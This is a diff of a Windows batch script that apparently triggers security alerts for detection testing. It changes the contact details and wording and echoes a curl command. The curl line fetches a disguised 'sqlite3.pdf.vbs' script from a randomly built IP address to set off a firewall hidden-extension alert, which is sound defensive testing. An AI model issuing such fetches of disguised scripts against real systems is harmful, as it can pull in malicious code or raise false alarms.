@@ -1,5 +1,5 @@
 @echo off
-:: For questions or modifications contact Mike Simone (mikesim@cisco.com)
+:: For questions or modifications contact Darryl Hicks (darhicks@cisco.com)
 setlocal enabledelayedexpansion
 :menu
 cls
@@ -82,7 +82,7 @@ goto end
 
 :firewall
 echo.
-echo This triggers a firewall "Potentially Hidden File Extension" Alert by attempting a CURL to vbs script from never before seen IP address.
+echo This triggers a firewall "Potentially Hidden File Extension" Alert by attempting a CURL for vbs script from never before seen IP address.
 echo. 
 echo It is expected this attempt will fail. Please wait.
 echo.
@@ -95,7 +95,9 @@ set /a x4=(%RANDOM% %% 255)
 :: Construct the URL with random IP
 set "url=http://%x1%.%x2%.%x3%.%x4%/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/sqlite3.pdf.vbs"
 :: Execute curl command
+@echo on
 curl "%url%"
+@echo off
 echo.
 echo.
 echo The trigger Completed Successfully!
